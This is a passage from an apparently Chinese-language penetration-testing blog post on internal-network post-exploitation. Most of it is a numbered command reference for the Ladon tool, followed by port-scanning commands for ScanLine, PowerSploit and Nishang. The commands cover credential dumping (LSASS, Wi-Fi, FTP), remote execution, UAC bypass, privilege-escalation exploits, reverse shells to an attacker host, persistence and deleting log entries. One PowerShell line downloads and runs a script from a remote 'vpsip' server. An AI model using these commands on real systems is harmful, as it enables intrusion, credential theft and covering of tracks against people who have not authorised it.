class="hljs-number">.5</span><br><br>##### <span class="hljs-number">076</span> HTTP密码嗅探 <br>Ladon HTTPSniffer <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span><br><br>##### <span class="hljs-number">077</span> 网络嗅探<br>Ladon Sniffer<br><br>### 密码读取<br><br>##### <span class="hljs-number">078</span> 读取IIS站点密码、网站路径<br>Ladon IISpwd<br><br>##### <span class="hljs-number">079</span> 读取连接过的WIFI密码<br>Ladon WifiPwd<br><br>##### <span class="hljs-number">080</span> 读取FileZilla FTP密码<br>Ladon FileZillaPwd<br><br>##### <span class="hljs-number">081</span> 读取系统Hash、VPN密码、DPAPI-Key<br>Ladon CVE<span class="hljs-number">-2021</span><span class="hljs-number">-36934</span><br><br>##### <span class="hljs-number">082</span> DumpLsass内存密码(mimikatz明文) 限<span class="hljs-number">9.1</span><span class="hljs-number">.1</span>版本之前<br>Ladon DumpLsass<br><br>### 信息收集<br><br>##### <span class="hljs-number">083</span> 获取本机内网IP与外网IP <br>Ladon GetIP<br><br>##### <span class="hljs-number">084</span> 获取PCname GUID CPUID DiskID Mac地址<br>Ladon GetID<br><br>##### <span class="hljs-number">085</span> 查看用户最近访问文件<br>Ladon Recent<br><br>##### <span class="hljs-number">086</span> USB使用记录查看(USB名称、USB标记、路径信息)<br>Ladon UsbLog<br><br>##### <span class="hljs-number">087</span> 检测后门(注册表启动项、DLL劫持)<br>Ladon CheckDoor<br>Ladon AutoRun<br><br>##### <span class="hljs-number">088</span> 进程详细信息(程序路径、位数、启动参数、用户) <br>Ladon EnumProcess<br>Ladon Tasklist<br><br>##### <span class="hljs-number">089</span> 获取命令行参数 <br>Ladon cmdline<br>Ladon cmdline cmd.exe<br><br>##### <span class="hljs-number">090</span> 获取渗透基础信息 <br>Ladon GetInfo<br>Ladon GetInfo2<br><br>##### <span class="hljs-number">091</span> .NET &amp; PowerShell版本 <br>Ladon NetVer<br>Ladon PSver<br>Ladon NetVersion<br>Ladon PSversion<br><br>##### <span class="hljs-number">092</span> 运行时版本&amp;编译环境 <br>Ladon Ver<br>Ladon Version<br><br>##### <span class="hljs-number">093</span> 运行时版本&amp;编译环境&amp;安装软件列表 <br>Ladon AllVer<br>Ladon AllVersion<br><br>##### <span class="hljs-number">094</span> 查看IE代理信息<br>Ladon QueryProxy<br><br>##### <span class="hljs-number">095</span>  列目录<br>Ladon DirList默认列全盘<br>Ladon DirList c:\   指定盘符或目录<br><br>##### <span class="hljs-number">096</span> QueryAdmin查看管理员用户<br>Ladon QueryAdmin<br><br>##### <span class="hljs-number">097</span> 查看本机命名管道<br>Ladon GetPipe<br><br>##### <span class="hljs-number">098</span> RdpLog查看<span class="hljs-number">3389</span>连接记录<br>Ladon RdpLog<br><br>### 远程执行(psexec/wmiexec/atexec/sshexec/smbexec)<br><br>##### <span class="hljs-number">099</span> <span class="hljs-number">445</span>端口 加密PSEXEC远程执行命令（交互式）<br><br>net user \\<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege520 /user:k8gege<br>Ladon psexec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span><br>psexec&gt; whoami<br>nt authority\<span class="hljs-keyword">system</span><br><br>##### <span class="hljs-number">100</span> <span class="hljs-number">135</span>端口 WmiExec远程执行命令 （非交互式）<br>Ladon wmiexec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 whoami  (<span class="hljs-number">8.2</span>前用法)<br>Ladon wmiexec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 cmd whoami  (<span class="hljs-number">8.2</span>后用法)<br>Ladon wmiexec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 b64cmd d2hvYW1p  (<span class="hljs-number">8.2</span>后用法)<br><br>##### <span class="hljs-number">101</span> <span class="hljs-number">445</span>端口 AtExec远程执行命令（非交互式）<br>Ladon wmiexec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 whoami<br><br>##### <span class="hljs-number">102</span> <span class="hljs-number">22</span>端口 SshExec远程执行命令（非交互式）<br>Ladon SshExec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 whoami<br>Ladon SshExec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">22</span> k8gege k8gege520 whoami<br><br>##### <span class="hljs-number">103</span> JspShell远程执行命令（非交互式）<br>Usage：Ladon JspShell type url pwd cmd<br>Example: Ladon JspShell ua http:<span class="hljs-comment">//192.168.1.8/shell.jsp Ladon whoami</span><br><br>##### <span class="hljs-number">104</span> WebShell远程执行命令（非交互式）<br>```Bash<br>Usage：Ladon WebShell ScriptType ShellType url pwd cmd<br>Example: Ladon WebShell jsp ua http:<span class="hljs-comment">//192.168.1.8/shell.jsp Ladon whoami</span><br>Example: Ladon WebShell aspx cd http:<span class="hljs-comment">//192.168.1.8/1.aspx Ladon whoami</span><br>Example: Ladon WebShell php ua http:<span class="hljs-comment">//192.168.1.8/1.php Ladon whoami</span><br>```<br><br>##### <span class="hljs-number">105</span> <span class="hljs-number">135</span>端口 WmiExec2远程执行命令 （非交互式）支持文件上传<br>Usage:<br>Ladon WmiExec2 host user pass cmd whoami<br>Ladon WmiExec2 pth host cmd whoami<br>Base64Cmd for Cobalt Strike<br>Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA<br>Ladon WmiExec2 host user pass b64cmd dwBoAG8AYQBtAGkA<br>Upload:<br>Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe<br>Ladon WmiExec2 pth host upload beacon.exe ceacon.exe<br><br>##### <span class="hljs-number">106</span> <span class="hljs-number">445</span>端口 SmbExec Ntlm-Hash非交互式远程执行命令(无回显)<br>Ladon SmbExec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 cmd whoami  <br>Ladon SmbExec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> k8gege k8gege520 b64cmd d2hvYW1p<br><br>##### <span class="hljs-number">107</span> WinrmExec远程执行命令无回显（支持System权限）<br>Ladon WinrmExec <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">5985</span> k8gege.org Administrator K8gege520 calc.exe<br><br><br>### 提权降权<br><br>##### <span class="hljs-number">108</span> whoami查看当前用户权限以及特权<br>Ladon whoami<br><br>##### <span class="hljs-number">109</span>  <span class="hljs-number">6</span>种白名单BypassUAC(<span class="hljs-number">8.0</span>后)Win7-Win10<br>用法: Ladon BypassUAC Method Base64Cmd<br><br>Ladon BypassUAC eventvwr Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC fodhelper Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC computerdefaults Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC sdclt Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC slui Y21kIC9jIHN0YXJ0IGNhbGMuZXhl<br>Ladon BypassUAC dikcleanup Y21kIC9jIHN0YXJ0IGNhbGMuZXhlICYmIFJFTQ==<br><br>##### <span class="hljs-number">110</span> BypassUac2 绕过UAC执行,支持Win7-Win10 <br>Ladon BypassUac2 c:\<span class="hljs-number">1.</span>exe<br>Ladon BypassUac2 c:\<span class="hljs-number">1.</span>bat<br><br>##### <span class="hljs-number">111</span> PrintNightmare (CVE<span class="hljs-number">-2021</span><span class="hljs-number">-1675</span> | CVE<span class="hljs-number">-2021</span><span class="hljs-number">-34527</span>)打印机漏洞提权EXP <br>Ladon PrintNightmare c:\evil.dll<br>Ladon CVE<span class="hljs-number">-2021</span><span class="hljs-number">-1675</span> c:\evil.dll<br><br>##### <span class="hljs-number">112</span> CVE<span class="hljs-number">-2022</span><span class="hljs-number">-21999</span> SpoolFool打印机漏洞提权EXP <br>Ladon SpoolFool poc.dll<br>Ladon CVE<span class="hljs-number">-2022</span><span class="hljs-number">-21999</span> poc.dll<br><br>##### <span class="hljs-number">113</span> GetSystem 提权System权限执行CMD<br>Ladon GetSystem cmd.exe<br><br>##### <span class="hljs-number">114</span> 复制令牌执行CMD(如<span class="hljs-keyword">system</span>权限降权exploer当前用户)<br>Ladon GetSystem cmd.exe explorer<br><br>##### <span class="hljs-number">115</span> Runas 模拟用户执行命令 <br>Ladon Runas user pass cmd<br><br>##### <span class="hljs-number">116</span> MS16135提权至SYSTEM<br>Ladon ms16135 whoami<br><br>##### <span class="hljs-number">117</span> BadPotato服务用户提权至SYSTEM<br>Ladon BadPotato cmdline<br><br>##### <span class="hljs-number">118</span> SweetPotato服务用户提权至SYSTEM <br>Ladon SweetPotato cmdline<br><br>##### <span class="hljs-number">119</span> EfsPotato Win7<span class="hljs-number">-2019</span>提权(服务用户权限提到<span class="hljs-keyword">system</span>)<br>Ladon EfsPotato whoami<br><br>##### <span class="hljs-number">120</span> Open3389一键开启<span class="hljs-number">3389</span><br>Ladon Open3389<br><br>##### <span class="hljs-number">121</span> 激活内置管理员Administrator<br>Ladon ActiveAdmin<br><br>##### <span class="hljs-number">122</span> 激活内置用户Guest<br>Ladon ActiveGuest<br><br>### 反弹Shell<br><br>##### <span class="hljs-number">123</span> 反弹TCP NC Shell<br>Ladon ReverseTcp <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> nc<br><br>##### <span class="hljs-number">124</span> 反弹TCP MSF Shell<br>Ladon ReverseTcp <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> shell<br><br>##### <span class="hljs-number">125</span> 反弹TCP MSF MET Shell<br>Ladon ReverseTcp <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> meter<br><br>##### <span class="hljs-number">126</span> 反弹HTTP MSF MET Shell<br>Ladon ReverseHttp <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span><br><br>##### <span class="hljs-number">127</span> 反弹HTTPS MSF MET Shell<br>Ladon ReverseHttps <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span><br><br>##### <span class="hljs-number">128</span> 反弹TCP CMD &amp; PowerShell Shell<br>Ladon PowerCat <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> cmd<br>Ladon PowerCat <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> psh<br><br>##### <span class="hljs-number">129</span> 反弹UDP Cmd &amp; PowerShell Shell<br>Ladon PowerCat <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> cmd udp<br>Ladon PowerCat <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> <span class="hljs-number">4444</span> psh udp<br><br>##### <span class="hljs-number">130</span>  netsh本机<span class="hljs-number">888</span>端口转发至<span class="hljs-number">112</span>的<span class="hljs-number">22</span>端口<br>Ladon netsh add <span class="hljs-number">888</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.112</span> <span class="hljs-number">22</span><br><br>##### <span class="hljs-number">131</span>  PortTran端口转发(<span class="hljs-number">3389</span>例子)<br>VPS监听: Ladon PortTran <span class="hljs-number">8000</span> <span class="hljs-number">338</span><br>目标转发: Ladon PortTran 内网IP <span class="hljs-number">3389</span> VPS_IP <span class="hljs-number">8000</span><br>本机连接: mstsc VPS_IP:<span class="hljs-number">338</span><br><br>### 本机执行<br>##### <span class="hljs-number">132</span> RDP桌面会话劫持（无需密码）<br>Ladon RdpHijack <span class="hljs-number">3</span><br>Ladon RdpHijack <span class="hljs-number">3</span> console<br><br>##### <span class="hljs-number">133</span> 添加注册表Run启动项<br>Ladon RegAuto Test c:\<span class="hljs-number">123.</span>exe<br><br>##### <span class="hljs-number">134</span> AT计划执行程序(无需时间)(<span class="hljs-keyword">system</span>权限)<br>Ladon at c:\<span class="hljs-number">123.</span>exe<br>Ladon at c:\<span class="hljs-number">123.</span>exe gui<br><br>##### <span class="hljs-number">135</span> SC服务加启动项&amp;执行程序(<span class="hljs-keyword">system</span>权限）<br>Ladon sc c:\<span class="hljs-number">123.</span>exe<br>Ladon sc c:\<span class="hljs-number">123.</span>exe gui<br>Ladon sc c:\<span class="hljs-number">123.</span>exe auto ServerName<br><br>### 系统信息探测<br><br>##### <span class="hljs-number">136</span>  Snmp协议探测操作系统、设备等信息<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SnmpScan <br><br>##### <span class="hljs-number">137</span>  Nbt协议探测Windows主机名、域、用户<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> NbtInfo<br><br>##### <span class="hljs-number">138</span>  Smb协议探测Windows版本、主机名、域<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SmbInfo<br><br>##### <span class="hljs-number">139</span>  Wmi协议探测Windows版本、主机名、域<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WmiInfo<br><br>##### <span class="hljs-number">140</span>  Mssql协议探测Windows版本、主机名、域<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MssqlInfo<br><br>##### <span class="hljs-number">141</span>  Winrm协议探测Windows版本、主机名、域<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WinrmInfo<br><br>##### <span class="hljs-number">142</span>  Exchange探测Windows版本、主机名、域<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> ExchangeInfo<br><br>##### <span class="hljs-number">143</span>  Rdp协议探测Windows版本、主机名、域<br>For单线程: Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> RdpInfo f=<span class="hljs-number">1</span><br><br>### 其它功能<br><br>##### <span class="hljs-number">144</span> Win2008一键启用.net <span class="hljs-number">3.5</span><br>Ladon EnableDotNet<br><br>##### <span class="hljs-number">145</span> 获取内网站点HTML源码 <br>Ladon gethtml http:<span class="hljs-comment">//192.168.1.1</span><br><br>##### <span class="hljs-number">146</span> 一键迷你WEB服务器 <br>Ladon web <span class="hljs-number">80</span><br>Ladon web <span class="hljs-number">80</span> dir<br><br>获取外网IP(VPS上启动WEB,目标访问ip.txt或ip.jpg)<br>http:<span class="hljs-comment">//192.168.1.8/ip.txt</span><br><br>##### <span class="hljs-number">147</span> getstr/getb64/debase64(无回显漏洞回显结果)<br>监听 Ladon web <span class="hljs-number">800</span><br><br>提交 返回明文<br>certutil.exe -urlcache -split -f http:<span class="hljs-comment">//192.168.1.8:800/getstr/test123456</span><br>Base64加密结果<br>certutil.exe -urlcache -split -f http:<span class="hljs-comment">//192.168.1.110:800/getbase64/k8gege520</span><br>Base64结果解密<br>certutil.exe -urlcache -split -fhttp:<span class="hljs-comment">//192.168.1.110:800/debase64/azhnZWdlNTIw</span><br><br>##### <span class="hljs-number">148</span> Shiro插件探测<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> IsShiro<br><br>##### <span class="hljs-number">149</span> LogDelTomcat 删除Tomcat指定IP日志<br>Ladon LogDelTomcat access.log <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span><br><br>##### <span class="hljs-number">150</span> C#自定义程序集插件扫描<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> Poc.exe<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> *.dll(c#)<br><br></code></pre></td></tr></table></figure><h2 id="2-内网端口扫描"><a href="#2-内网端口扫描" class="headerlink" title="2.内网端口扫描"></a>2.内网端口扫描</h2><p>​通过查询目标主机的端口开放信息，不仅可以了解目标主机所开放的服务，还可以找出其开放服务的涌洞、分析目 标网络的拓扑结构等， 在进行内网渗测试时，通常会使用Metasploit内置的端口进行扫描。也可以上传端口扫描工 具，使用工具进行扫描。还可以根据服务器的环境，使用自定义的端口扫描脚本进行扫描。在获得授权的情况下， 可以直接使用Nmap、masscan等端口扫描工具获取开放的端口信息。</p><h3 id="Scanline"><a href="#Scanline" class="headerlink" title="Scanline"></a>Scanline</h3><p>ScanLine是一款windows下的端口扫描的命令行程序。它可以完成PING扫描、TCP端口扫描、UDP端口扫描等功 能。运行速度很快，不需要winPcap库支持，应用场合受限较少。</p><p>用法：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">‐？ ‐ 显示此帮助文本<br>‐b ‐ 获取端口banner<br>‐c ‐ TCP 和 UDP 尝试超时（毫秒）。 默认值为 4000<br>‐d ‐ 扫描之间的延迟（毫秒）。 默认为 0<br>‐f ‐ 从文件中读取 IP。 使用“stdin”作为标准输入<br>‐g ‐ 绑定到给定的本地端口<br>‐h ‐ 隐藏没有开放端口的系统的结果<br>‐i ‐ 除了 Echo 请求之外，用于<span class="hljs-built_in"> ping </span>使用 ICMP 时间戳请求<br>‐j ‐ 不要在<span class="hljs-built_in"> IP </span>之间输出“‐‐‐‐‐<span class="hljs-built_in">..</span>.”分隔符<br>‐l ‐ 从文件中读取 TCP 端口<br>‐L ‐ 从文件中读取 UDP 端口<br>‐m ‐ 绑定到给定的本地接口<span class="hljs-built_in"> IP</span><br><span class="hljs-built_in"></span>‐n ‐ 不扫描端口 ‐ 仅 ping（除非您使用 ‐p）<br>‐o ‐ 输出文件（覆盖）<br>‐O ‐ 输出文件（追加）<br>‐p ‐ 扫描前不要<span class="hljs-built_in"> ping </span>主机<br>‐q ‐<span class="hljs-built_in"> ping </span>超时（毫秒）。 默认值为 2000<br>‐r ‐ 将<span class="hljs-built_in"> IP </span>地址解析为主机名<br>‐s ‐ 以逗号分隔格式输出 (csv)<br>‐t ‐ 要扫描的 TCP 端口（以逗号分隔的端口/范围列表）<br>‐T ‐ 使用 TCP 端口的内部列表<br>‐u ‐ 要扫描的 UDP 端口（以逗号分隔的端口/范围列表）<br>‐U ‐ 使用 UDP 端口的内部列表<br>‐v ‐ 详细模式<br>‐z ‐ 随机化<span class="hljs-built_in"> IP </span>和端口扫描顺序<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scanline</span>.exe ‐bhpt <span class="hljs-number">21</span>‐<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">80</span>,<span class="hljs-number">110</span>,<span class="hljs-number">135</span>‐<span class="hljs-number">139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5556</span>,<span class="hljs-number">5631</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">8080</span> <span class="hljs-number">100.100.210.30</span><br><span class="hljs-attribute">scanline</span>.exe ‐bhpt <span class="hljs-number">80</span>,<span class="hljs-number">443</span> <span class="hljs-number">100.100.0.1</span>‐<span class="hljs-number">254</span>(IP)<br><span class="hljs-attribute">scanline</span>.exe ‐bhpt <span class="hljs-number">0</span>-<span class="hljs-number">4000</span> IP<br></code></pre></td></tr></table></figure><img src="/img/image-20231006152330189.png" alt="image-20231006152330189" style="zoom: 80%;" /><h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p>Telnet协议是TCP&#x2F;IP协议族的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算 机上完成远程主机工作的能力。在目标计算机上使用Telnet协议，可以与目标服务器建立连接。如果只是想快速探 测某台主机的某个常规高危端口是否开放，使用telnet命令是最方便的</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">telnet</span> <span class="hljs-built_in">IP</span> 端口<br></code></pre></td></tr></table></figure><p>能连接则说明开放</p><h3 id="RedTeamTool"><a href="#RedTeamTool" class="headerlink" title="RedTeamTool"></a>RedTeamTool</h3><p>包含多个工具</p><p>这里使用本地端口扫描工具</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">portscanx64</span>.exe <span class="hljs-number">5000</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006153403301.png" alt="image-20231006153403301"></p><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit是一款基于PowerShell的后渗透框架软件，包含了很多PowerShell的攻击脚本，它们主要用于渗透中 的信息侦测，权限提升、权限维持等</p><p>下载地址： <a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p><p>用法：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs">ActivirusBypass：发现杀毒软件的查杀特征<br>CodeExecution：在目标主机上执行代码<br>Exfiltration：目标主机上的信息搜集工具<br>Mayhem：蓝屏等破坏性的脚本<br>Persistence：后门脚本<br>Privsec：提权等脚本<br>Recon：以目标主机为跳板进行内网信息侦查<br>ScriptModification：在目标主机上创建或修改脚本<br></code></pre></td></tr></table></figure><p>这里只需上传Invoke-Portscan.ps1即可</p><p>本地执行<strong>（上传文件到靶机）</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -exec bypass Import-Module .\Invoke-Portscan.ps1;Invoke-Portscan -Hosts <span class="hljs-number">10.210.100.0</span>/<span class="hljs-number">24</span> -T <span class="hljs-number">4</span> -ports &#x27;<span class="hljs-number">445</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">80</span>&#x27; ‐oA c:\<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p>远程执行<strong>（从远程服务器上下载并执行）</strong></p><p>python -m http.server 80 开启http服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> -exec bypass -c IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://vpsip:<span class="hljs-number">8080</span>/Invoke-Portscan.ps1&#x27;);import-module .\Invoke-Portscan.ps1;Invoke-Portscan -Hosts <span class="hljs-number">10.210.100.30</span> -T <span class="hljs-number">4</span> -ports &#x27;<span class="hljs-number">445</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">80</span>&#x27; -oA c:\<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006155611749.png" alt="image-20231006155611749"></p><h3 id="Nishang"><a href="#Nishang" class="headerlink" title="Nishang"></a>Nishang</h3><p>Nishang是一款针对PowerShell的渗透工具</p><p>下载地址 <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> </p><p>阅读 <a href="https://dude6.com/article/116047.html">https://dude6.com/article/116047.html</a></p><p>需要上传整个zip  解压使用unzip.exe即可</p><p><img src="/img/image-20231006160356578.png" alt="image-20231006160356578"></p><p>使用方式：(注意：以下命令在cs执行时加shell powershell)</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-ExecutionPolicy <span class="hljs-comment">remotesigned</span> 允许导入<br>Import-Module <span class="hljs-comment">.\nishang\nishang.psm1</span> 导入模块<br>Invoke-PortScan <span class="hljs-comment">-StartAddress 10.210.100.1 -EndAddress 10.210.100.30 -ResolveHost</span> 扫描<br><br>上面命令如果不行，执行下面这条：<br>powershell <span class="hljs-comment">-command</span> <span class="hljs-comment">&quot;&amp; &#123; import-module .\nishang\nishang.psm1;Invoke-PortScan -StartAddress 10.210.100.1 -EndAddress 10.210.100.30 -ResolveHost&#125;&quot;</span><br><br>指定端口扫描<br>powershell <span class="hljs-comment">-command</span> <span class="hljs-comment">&quot;&amp; &#123; import-module .\nishang\nishang.psm1;Invoke-PortScan -StartAddress 10.210.100.1 -EndAddress 10.210.100.30 -ResolveHost -ScanPort -Port 445&#125;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231006161611543.png" alt="image-20231006161611543"></p><p>方式二：将nishang文件夹放在cs目录下</p><p><img src="/img/image-20231006171820274.png" alt="image-20231006171820274"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span>-import nishang\nishang.psm1<br><span class="hljs-attribute">powershell</span> Invoke-PortScan -StartAddress <span class="hljs-number">10.210.100.1</span> -EndAddress <span class="hljs-number">10.210.100.30</span> -ResolveHost<br></code></pre></td></tr></table></figure><h3 id="Kscan-1"><a href="#Kscan-1" class="headerlink" title="Kscan"></a>Kscan</h3><p>kscan是一款资产测绘工具，可针对指定资产进行端口扫描以及TCP指纹识别和Banner抓取，在不发送更多的数据包的情况下尽可能的获取端口更多信息。并能够针对扫描结果进行自动化暴力破解， 且是go平台首款开源的RDP暴力破解工具</p><p>下载地址 <a href="https://github.com/lcvvvv/kscan">https://github.com/lcvvvv/kscan</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">usage: kscan [-h,<span class="hljs-params">--help</span>,<span class="hljs-params">--fofa-syntax</span>] <span class="hljs-params">(-t,--target,-f,--fofa,--spy)</span> [-p,<span class="hljs-params">--port</span>|<span class="hljs-params">--top</span>] [-o,<span class="hljs-params">--output</span>] [-oJ] [<span class="hljs-params">--proxy</span>] [<span class="hljs-params">--threads</span>] [<span class="hljs-params">--path</span>] [<span class="hljs-params">--host</span>] [<span class="hljs-params">--timeout</span>] [-Pn] [-Cn] [-sV] [<span class="hljs-params">--check</span>] [<span class="hljs-params">--encoding</span>] [<span class="hljs-params">--hydra</span>] [hydra options] [fofa options]<br><br><br>optional arguments:<br>  -h , <span class="hljs-params">--help</span>     show this <span class="hljs-keyword">help</span> message and exit<br>  -f , <span class="hljs-params">--fofa</span>     从fofa获取检测对象，需提前配置环境变量<span class="hljs-function">:FOFA_EMAIL</span>、FOFA_KEY<br>  -t , <span class="hljs-params">--target</span>   指定探测对象：<br>                  IP地址：114.114.114.114<br>                  IP地址段：114.114.114.114/24,不建议子网掩码小于12<br>                  IP地址段：114.114.114.114-115.115.115.115<br>                  URL地址：https:<span class="hljs-string">//www.baidu.com</span><br>                  文件地址：file:<span class="hljs-string">/tmp/target.txt</span><br>  <span class="hljs-params">--spy</span>           